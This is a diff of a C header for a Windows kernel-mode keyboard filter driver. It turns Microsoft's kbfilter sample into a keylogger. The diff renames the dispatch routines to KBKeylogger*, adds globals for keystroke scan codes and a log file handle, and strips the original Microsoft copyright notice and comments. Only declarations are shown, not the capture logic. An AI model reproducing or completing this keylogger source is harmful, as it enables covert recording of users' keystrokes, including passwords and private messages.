@@ -1,27 +1,3 @@
-/*++
-Copyright (c) 1997  Microsoft Corporation
-
-Module Name:
-
-    kbfilter.h
-
-Abstract:
-
-    This module contains the common private declarations for the keyboard
-    packet filter
-
-Environment:
-
-    kernel mode only
-
-Notes:
-
-
-Revision History:
-
-legacy_stdio_definitions.lib
---*/
-
 
 #ifndef KBFILTER_H
 #define KBFILTER_H
@@ -32,7 +8,8 @@ legacy_stdio_definitions.lib
 #include <ntddkbd.h>
 #include <ntdd8042.h>
 #include <ntdd8042.h>
-#include <stdio.h>
+#include <wchar.h>
+#include <ntstrsafe.h>
 #define KBFILTER_POOL_TAG (ULONG) 'tlfK'
 #undef ExAllocatePool
 #define ExAllocatePool(type, size) \
@@ -63,66 +40,35 @@ volatile LONG gSysEnters = 0;
 PDEVICE_OBJECT g_pDeviceObject = NULL;
 PDEVICE_OBJECT g_pControlDeviceObject = NULL;
 
-
-NTSTATUS            FileStatus;
-HANDLE              TestFile;
-OBJECT_ATTRIBUTES   ObjAttr;
-IO_STATUS_BLOCK     IoStatus;
-FILE_STANDARD_INFORMATION FileInfo;
-UNICODE_STRING      TestName;
+USHORT						 scanCode = 0;
+PKEYBOARD_INPUT_DATA		 KeyData;
+HANDLE						 hLogFile;
+OBJECT_ATTRIBUTES			 ObjAttr;
+IO_STATUS_BLOCK				 IoStatus;
+UNICODE_STRING				 logNameFile;
 typedef struct _DEVICE_EXTENSION
 {
-    //
-    // A backpointer to the device object for which this is the extension
-    //
+ 
     PDEVICE_OBJECT  Self;
 
-    //
-    // "THE PDO"  (ejected by the root bus or ACPI)
-    //
     PDEVICE_OBJECT  PDO;
 
-    //
-    // The top of the stack before this filter was added.  AKA the location
-    // to which all IRPS should be directed.
-    //
     PDEVICE_OBJECT  TopOfStack;
 
-    //
-    // Number of creates sent down
-    //
     LONG EnableCount;
 
-    //
-    // The real connect data that this driver reports to
-    //
     CONNECT_DATA UpperConnectData;
-
-    //
-    // Previous initialization and hook routines (and context)
-    //                               
+                            
     PVOID UpperContext;
     PI8042_KEYBOARD_INITIALIZATION_ROUTINE UpperInitializationRoutine;
     PI8042_KEYBOARD_ISR UpperIsrHook;
 
-    //
-    // Write function from within KbFilter_IsrHook
-    //
     IN PI8042_ISR_WRITE_PORT IsrWritePort;
 
-    //
-    // Queue the current packet (ie the one passed into KbFilter_IsrHook)
-    //
     IN PI8042_QUEUE_PACKET QueueKeyboardPacket;
 
-    //
-    // Context for IsrWritePort, QueueKeyboardPacket
-    //
     IN PVOID CallContext;
 
-    //
-    // current power state of the device
-    //
     DEVICE_POWER_STATE  DeviceState;
 
     BOOLEAN         Started;
@@ -130,10 +76,6 @@ typedef struct _DEVICE_EXTENSION
     BOOLEAN         Removed;
 
 } DEVICE_EXTENSION, *PDEVICE_EXTENSION;
-
-//
-// Prototypes
-//
 
 NTSTATUS
 AddDevice(
@@ -143,8 +85,8 @@ AddDevice(
 
 NTSTATUS ReadCompletion(
 	IN PDEVICE_OBJECT DeviceObject,
-	IN PIRP Irp,
-	IN PVOID Context
+	IN PIRP			  Irp,
+	IN PVOID		  Context
 );
 
 NTSTATUS
@@ -162,31 +104,25 @@ KBKeyloggerCreateClose (
 NTSTATUS
 KBKeyloggerDispatchPassThrough(
         IN PDEVICE_OBJECT DeviceObject,
-        IN PIRP Irp
+        IN PIRP			  Irp
         );
    
 NTSTATUS
 KBKeyloggerInternIoCtl (
     IN PDEVICE_OBJECT DeviceObject,
-    IN PIRP Irp
-    );
-
-NTSTATUS
-IoCtl (
-    IN PDEVICE_OBJECT DeviceObject,
-    IN PIRP Irp
+    IN PIRP			 Irp
     );
 
 NTSTATUS
 KBKeyloggerPnP (
     IN PDEVICE_OBJECT DeviceObject,
-    IN PIRP Irp
+    IN PIRP			  Irp
     );
 
 NTSTATUS
 KBKeyloggerPower (
     IN PDEVICE_OBJECT DeviceObject,
-    IN PIRP Irp
+    IN PIRP			  Irp
     );
 
 NTSTATUS
@@ -222,7 +158,7 @@ Unload (
     IN PDRIVER_OBJECT DriverObject
     );
 
-#endif  // KBFILTER_H
+#endif  
 
 
 
